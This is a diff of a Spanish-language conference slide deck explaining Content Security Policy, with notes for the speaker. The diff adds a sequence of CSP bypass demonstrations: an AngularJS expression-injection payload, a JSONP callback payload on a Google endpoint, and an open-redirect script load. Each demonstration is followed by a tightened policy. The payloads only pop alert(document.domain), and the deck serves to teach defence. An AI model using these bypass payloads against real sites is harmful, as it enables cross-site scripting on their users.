@@ -120,7 +120,8 @@
           <li>Había escuchado sobre CSP</li>
           <li>En el trabajo me tocó iniciar la implementación de CSP</li>
           <li>Bug bounty: XSS en una web con CSP usando nonces. No pude ejecutar JS, pero pude demostrar impacto</li>
-          <li>Bug bounty: XSS en una web con CSP, muy restrictiva pero sin nonces. Puede hacer un bypass y ejeuctar JS</li>
+          <li>Bug bounty: XSS en una web con CSP, muy restrictiva pero sin nonces. Puede hacer un bypass y ejeuctar JS
+          </li>
           <li>Esta charla</li>
         </ul>
 
@@ -166,8 +167,8 @@
           Les he estado mencionando cosas como CSP, XSS, nonces,
           y tal vez se estén preguntando qué diablos estoy diciendo.
 
-          Content security policy, o CSP, es una capa de seguridad adicional que ayuda a detectar y mitigar ciertos tipos de ataques,
-          incluyendo Cross Site Scripting (XSS) y ataques de inyección de datos.
+          Content security policy, o CSP, es una capa de seguridad adicional que ayuda a detectar y mitigar ciertos
+          tipos de ataques, incluyendo Cross Site Scripting (XSS) y ataques de inyección de datos.
 
         </aside>
       </section>
@@ -179,12 +180,14 @@
 
         <p>
           Mediante el header <code>Content-Security-Policy</code> que el servidor envía en la respuesta HTTP,
-          este header contiene una serie de reglas que le indican al navegador qué recursos puede cargar y ejecutar en la página web.
+          este header contiene una serie de reglas que le indican al navegador qué recursos puede cargar y ejecutar en
+          la página web.
         </p>
 
         <aside class="notes">
           Esto se hace mediante el header Content-Security-Policy que el servidor envía en la respuesta HTTP,
-          este header contiene una serie de reglas que le indican al navegador qué recursos puede cargar y ejecutar en la página web.
+          este header contiene una serie de reglas que le indican al navegador qué recursos puede cargar y ejecutar en
+          la página web.
         </aside>
       </section>
 
@@ -198,8 +201,8 @@
         <aside class="notes">
           La sintaxis de CSP es la siguiente,
           tenemos el header Content-Security-Policy, seguido de una serie de directivas y valores.
-          Cada directiva está separada por un punto y coma, y cada directiva puede tener uno o más valores separados por un espacio.
-          o puede no tener valores.
+          Cada directiva está separada por un punto y coma, y cada directiva puede tener uno o más valores separados por
+          un espacio. o puede no tener valores.
         </aside>
       </section>
 
@@ -231,8 +234,8 @@
         </ul>
         <aside class="notes">
           Las directivas de CSP se dividen en varias categorías,
-          Fetch directives, que controlan qué recursos se pueden cargar, como scripts, imágenes, CSS, qué APIs pueden ser usadas.
-          Document directives, controlan aspectos de un documento HTML.
+          Fetch directives, que controlan qué recursos se pueden cargar, como scripts, imágenes, CSS, qué APIs pueden
+          ser usadas. Document directives, controlan aspectos de un documento HTML.
           Navigation directives, que controlan a qué orígenes un usuario puede navegar o enviar formularios.
           Y Reporting directives, que controlan a dónde se envían los reportes de violaciones de CSP.
         </aside>
@@ -300,16 +303,30 @@
       </section>
 
       <section>
+        <h2>Código inline JS encontrado en el sitio</h2>
+
+        <pre class=""><code data-trim data-noescape class="javascript">
+function isOdd(n) {
+  return n % 2 === 1;
+}
+
+function isEven(n) {
+  return !isOdd(n);
+}
+        </code></pre>
+      </section>
+
+      <section>
         <h2>La política (im)perfecta</h2>
         <pre class=""><code data-trim data-noescape class="http">
           Content-Security-Policy:
             script-src
               'self'
               'unsafe-inline'
+              'unsafe-eval'
               https://*.google.com
               https://*.gstatic.com
-              https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js
-              'unsafe-eval'
+              https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;
         </code></pre>
       </section>
 
@@ -331,24 +348,200 @@
           &lt;/script&gt;
         </code></pre>
 
+        <p>
+          <small>
+            <a href="examples/01.html" target="_blank">examples/01.html</a>
+          </small>
+        </p>
+
         <aside class="notes">
 
         </aside>
       </section>
 
       <section>
-        <h2>Ejemplo de bloque de código</h2>
-        <p>
-          Código de ejemplo
-        </p>
-
-        <pre class=""><code data-trim data-noescape class="python">
-            print("Hola mundo")
-        </code></pre>
+        <h2>Sitio libre de inline JS</h2>
+        <img src="img/later-six-months.jpg" alt="">
 
         <aside class="notes">
-          Notas
+          Luego de un duro trabajo, logramos limpiar el sitio de código JavaScript inline.
+          Tuvimos que mover nuestra función isOdd a un archivo externo, y cargarlo en la página,
+          y luego hasta lo convertimos en un paquete de npm.
+          Resulta que es una funcionalidad muy útil, y ahora tiene más de 250K descargas semanales,
+          y claro, también publicamos isEven como otro paquete.
         </aside>
+      </section>
+
+      <section>
+        <h2><s>Inline JS</s></h2>
+
+        <pre class=""><code data-trim data-noescape class="http">
+          Content-Security-Policy:
+            script-src
+              'self'
+              'unsafe-eval'
+              https://*.google.com
+              https://*.gstatic.com
+              https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/02.html" target="_blank">examples/02.html</a>
+          </small>
+        </p>
+
+        <aside class="notes">
+        </aside>
+      </section>
+
+      <section>
+        <h2>AngularJS</h2>
+
+        <pre class=""><code data-trim data-noescape class="html">
+&lt;script src&equals;&quot;https&colon;&sol;&sol;ajax&period;googleapis&period;com&sol;ajax&sol;libs&sol;angularjs&sol;1&period;8&period;2&sol;angular&period;min&period;js&quot;&gt;&lt;&sol;script&gt;&NewLine;&NewLine;&lt;div ng-app&equals;&quot;&quot; ng-csp&equals;&quot;&quot;&gt;&NewLine;  &lt;input ng-focus&equals;&quot;&dollar;event&period;composedPath&lpar;&rpar;&verbar;orderBy&colon;&apos;alert&lpar;document&period;domain&rpar;&apos;&quot; value&equals;&quot;Click me&excl;&quot;&gt;&NewLine;&lt;&sol;div&gt;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/03.html" target="_blank">examples/03.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2>Sitio libre AngularJS</h2>
+        <img src="img/later-eternity.jpg" alt="">
+
+        <aside class="notes">
+          Luego de un duro trabajo, logramos limpiar el sitio de AngularJS,
+          y pudimos eliminar la dependencia de AngularJS, y con ello también `unsafe-eval`.
+          Tuvimos que reescribir todo el sitio, y para ello pues analizamos
+          varias opciones para reemplazar AngularJS, opciones como React, Vue, Svelte.
+          Y obviamente, escogimos la mejor opción, JQuery.
+        </aside>
+      </section>
+
+      <section>
+        <h2><s>AngularJS</s> JQuery</h2>
+
+        <pre class=""><code data-trim data-noescape class="http">
+          Content-Security-Policy:
+            script-src
+              'self'
+              https://*.google.com
+              https://*.gstatic.com
+              https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/04.html" target="_blank">examples/04.html</a>
+          </small>
+        </p>
+
+        <aside class="notes">
+        </aside>
+      </section>
+
+      <section>
+        <h2>JSONP</h2>
+
+        <pre class=""><code data-trim data-noescape class="html">
+&lt;script
+    src&equals;&quot;https&colon;&sol;&sol;accounts&period;google&period;com&sol;o&sol;oauth2&sol;revoke&quest;callback&equals;alert&lpar;document&period;domain&rpar;&quot;&gt;
+&lt;&sol;script&gt;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/05.html" target="_blank">examples/05.html</a>
+          </small>
+        </p>
+
+        <aside class="notes">
+
+        </aside>
+      </section>
+
+      <section>
+        <h2>Sitio libre de JSONP</h2>
+        <img src="img/later-several-days.png" alt="">
+      </section>
+
+      <section>
+        <h2><s>JSONP</s></h2>
+
+        <pre class=""><code data-trim data-noescape class="http">
+          Content-Security-Policy:
+            script-src
+              'self'
+              https://www.google.com/recaptcha/
+              https://www.gstatic.com/recaptcha/
+              https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/06.html" target="_blank">examples/06.html</a>
+          </small>
+        </p>
+
+        <aside class="notes">
+        </aside>
+      </section>
+
+      <section>
+        <h2>Open redirect</h2>
+
+        <pre class=""><code data-trim data-noescape class="html">
+&lt;script&NewLine;  src&equals;&quot;&sol;&lowbar;&sol;redirect&sol;&quest;https&colon;&sol;&sol;cdn&period;jsdelivr&period;net&sol;gh&sol;stsewd&sol;charla-csp-xss&commat;main&sol;js&sol;test&period;js&quot;&gt;&NewLine;&lt;&sol;script&gt;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/07.html" target="_blank">examples/07.html</a>
+          </small>
+        </p>
+
+        <aside class="notes">
+        </aside>
+      </section>
+
+      <section>
+        <h2>Open redirect arreglado!</h2>
+        <img src="img/later-six-hours.jpg" alt="">
+        <aside class="notes">
+        </aside>
+      </section>
+
+      <section>
+        <h2>No CDN público</h2>
+        <pre class=""><code data-trim data-noescape class="http">
+          Content-Security-Policy:
+            script-src
+              'self'
+              https://www.google.com/recaptcha/
+              https://www.gstatic.com/recaptcha/
+              https://static.example.com/js/jquery@3.6.4/dist/jquery.min.js;
+        </code></pre>
+
+        <p>
+          <small>
+            <a href="examples/08.html" target="_blank">examples/08.html</a>
+          </small>
+        </p>
+      </section>
+
+      <section>
+        <h2></h2>
+        <p>
+          Ya vimos porque usar una lista de hosts permitidos no es suficiente para prevenir ataques XSS.
+        </p>
+      </section>
+
+      <section>
+        hash y nonces
       </section>
 
       <section data-transition="zoom">
@@ -408,7 +601,8 @@
         </footer>
 
         <aside class="notes">
-          Ahí les dejo el enlace a esta presentación y a mi blog donde a veces escribo cosas. y también estan las vulnerabilidades
+          Ahí les dejo el enlace a esta presentación y a mi blog donde a veces escribo cosas. y también estan las
+          vulnerabilidades
 
           Eso fue todo por hoy, espero hayan aprendido algo nuevo. Ahora vamos a las
           preguntas. Si algo no se entendió, es probablemente mi culpa, no lo expliqué
